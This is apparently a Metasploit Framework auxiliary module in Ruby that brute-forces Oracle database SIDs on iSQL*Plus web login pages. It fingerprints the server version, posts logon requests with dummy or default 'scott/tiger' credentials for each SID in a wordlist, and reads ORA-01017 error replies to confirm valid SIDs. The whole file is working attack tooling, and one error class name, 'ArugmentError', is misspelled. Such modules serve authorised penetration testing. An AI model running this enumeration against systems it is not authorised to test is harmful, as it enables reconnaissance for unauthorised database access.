##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/Framework/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report

  def initialize(info={})
    super(
        update_info(
            info,
            'Name'        => 'Oracle isqlplus SID Check',
            'Description' => %q{
              This module attempts to bruteforce the SID on the Oracle application server iSQL*Plus
              login pages.  It does this by testing Oracle error responses returned in the HTTP response.
              Incorrect username/pass with a correct SID will produce an Oracle ORA-01017 error.
              Works against Oracle 9.2, 10.1 & 10.2 iSQL*Plus.  This module will attempt to
              fingerprint the version and automatically select the correct POST request.
            },
            'References'  =>
                [
                    [ 'URL', 'http://carnal0wnage.attackresearch.com' ],
                ],
            'Author'      => [ 'CG', 'todb' ],
            'License'     => MSF_LICENSE
        )
    )

    register_options([
                         Opt::RPORT(5560),
                         OptString.new('URI', [ true, 'Oracle iSQLPlus path', '/isqlplus/']),
                         OptString.new('SID', [ false, 'A single SID to test']),
                         OptPath.new('SIDFILE', [ false, 'A file containing a list of SIDs', File.join(Msf::Config.install_root, 'data', 'wordlists', 'sid.txt')]),
                         OptInt.new('TIMEOUT', [false, 'Time to wait for HTTP responses', 30])
                     ], self.class)

    deregister_options(
        "RHOST", "USERNAME", "PASSWORD", "USER_FILE", "PASS_FILE", "USERPASS_FILE",
        "BLANK_PASSWORDS", "USER_AS_PASS", "REMOVE_USER_FILE", "REMOVE_PASS_FILE",
        "BRUTEFORCE_SPEED" # Slow as heck anyway
    )
  end

  def sid_file
    datastore['SIDFILE']
  end

  def hostport
    [target_host,rport].join(":")
  end

  def uri
    datastore['URI'] || "/isqlplus/"
  end

  def timeout
    (datastore['TIMEOUT'] || 30).to_i
  end

  def msg
    msg = "#{hostport} - Oracle iSQL*Plus -"
  end

  def run_host(ip)
    oracle_ver = get_oracle_version(ip)
    if not check_oracle_version(oracle_ver)
      print_error "#{msg} Unknown Oracle version, skipping."
      return
    end
    begin
      print_status("#{msg} Starting SID check")
      sid_data.each do |sid|
        guess = check_oracle_sid(ip,oracle_ver,sid)
        return if guess and datastore['STOP_ON_SUCCESS']
      end
      rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
        print_error "#{msg} Cannot connect"
      rescue ::Timeout::Error, ::Errno::EPIPE,Errno::ECONNRESET => e
        print_error e.message
    end
  end

  def get_oracle_version(ip)
    begin
      res = send_request_cgi({
        'version' => '1.1',
        'uri'     => uri,
        'method'  => 'GET',
      }, timeout)
      oracle_ver = nil
      if (res.nil?)
        print_error("#{msg} no response")
      elsif (res.code == 200)
        print_status("#{msg} Received an HTTP #{res.code}")
        oracle_ver = detect_oracle_version(res)
      elsif (res.code == 404)
        print_error("#{msg} Received an HTTP 404, check URIPATH")
      elsif (res.code == 302)
        print_error("#{msg} Received an HTTP 302 to #{res.headers['Location']}")
      else
        print_error("#{msg} Received an HTTP #{res.code}")
      end
      return oracle_ver
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout => e
      print_error "#{msg} Cannot connect"
    end
  end

  def detect_oracle_version(res)
    m = res.body.match(/iSQL\*Plus Release (9\.0|9\.1|9\.2|10\.1|10\.2)/)
    oracle_ver = nil
    oracle_ver = 10 if m[1] && m[1] =~ /10/
      oracle_ver = m[1].to_f if m[1] && m[1] =~ /9\.[012]/
      if oracle_ver
        print_status("#{msg} Detected Oracle version #{oracle_ver}")
        print_status("#{msg} SID detection for iSQL*Plus 10.1 may be unreliable") if oracle_ver == 10.1
      else
        print_error("#{msg} Unknown Oracle version detected.")
      end
    return oracle_ver
  end

  def check_oracle_version(ver)
    [9.0,9.1,9.2,10].include? ver
  end

  def build_post_request(ver,sid)
    post_request = nil
    case ver
    when 9.0
      post_request = "action=logon&sqlcmd=&sqlparms=&username=scott&password=tiger&sid=#{sid.strip}&privilege=&Log+In=%B5%C7%C2%BC"
    when 9.1
      post_request = "action=logon&username=a&password=a&sid=#{sid.strip}&login=Login"
    when 9.2
      post_request = "action=logon&username=a&password=a&sid=#{sid.strip}&login=Login"
    when 10
      post_request = "username=a&password=a&connectID=#{sid.strip}&report=&script=&dynamic=&type=&action=&variables=&event=login"
    end
    return post_request
  end

  def parse_isqlplus_response(res,sid)
    guess = false
    if (res.nil?)
      print_error("#{msg} No response")
    elsif (res.code == 200)
      if (res.body =~ /ORA-01017:/ or res.body =~ /ORA-28273:/)
        if sid.nil? || sid.empty?
          print_good("#{msg} Received ORA-01017 on a blank SID -- SIDs are not enforced upon login.")
        else
          print_good("#{msg} Received ORA-01017, probable correct SID '#{sid.strip}'")
        end
        guess = true
      elsif (res.body =~ /(ORA-12170):/ or res.body =~ /(ORA-12154):/ or res.body =~ /(ORA-12162):/)
        vprint_status("#{msg} Incorrect SID: '#{sid.strip}' (got error code #{$1})")
      elsif res.body =~ /(ORA-12541):/
        print_status("#{msg} Possible correct SID, but got ORA-12541: No Listener error.")
        guess = true
      else
        print_status("#{msg} Received an unknown error") # Should say what the error was
      end
    elsif (res.code == 404)
      print_status("#{msg} Received an HTTP 404, check URIPATH")
    elsif (res.code == 302)
      print_status("#{msg} Received an HTTP 302 redirect to #{res.headers['Location']}")
    else
      print_status("#{msg} Received an unexpected response: #{res.code}")
    end

    report_isqlplus_service(target_host,res) if res
    return guess
  end

  def report_isqlplus_service(ip,res)
    sname = datastore['SSL'] ? 'https' : 'http'
    report_service(
      :host => ip,
      :proto => 'tcp',
      :port => rport,
      :name => sname,
      :info => res.headers["Server"].to_s.strip
    )
  end

  def report_oracle_sid(ip,sid)
    report_note(
      :host => ip,
      :proto => 'tcp',
      :port => rport,
      :type => "oracle.sid",
      :data => ((sid.nil? || sid.empty?) ? "*BLANK*" : sid),
      :update => :unique_data
    )
  end

  def sid_data
    if datastore['SID'] and not datastore['SID'].empty?
      [datastore['SID']]
    elsif sid_file and ::File.readable? sid_file
      ::File.open(sid_file,"rb") {|f| f.read f.stat.size}.each_line.map {|x| x.strip.upcase}.uniq
    else
      raise ArugmentError, "Cannot read file '#{sid_file}'"
    end
  end

  def check_oracle_sid(ip,oracle_ver,sid)
    post_request = build_post_request(oracle_ver,sid)
    vprint_status "#{msg} Trying SID '#{sid}', waiting for response..."
    res = send_request_cgi({
      'version' => '1.1',
      'uri'     => uri,
      'method'  => 'POST',
      'data'   => post_request,
      'headers' =>
      {
        'Referer' => "http://#{ip}:#{rport}#{uri}"
      }
    }, timeout)
    guess = parse_isqlplus_response(res,sid)
    report_oracle_sid(ip,sid) if guess
    return guess
  end

end
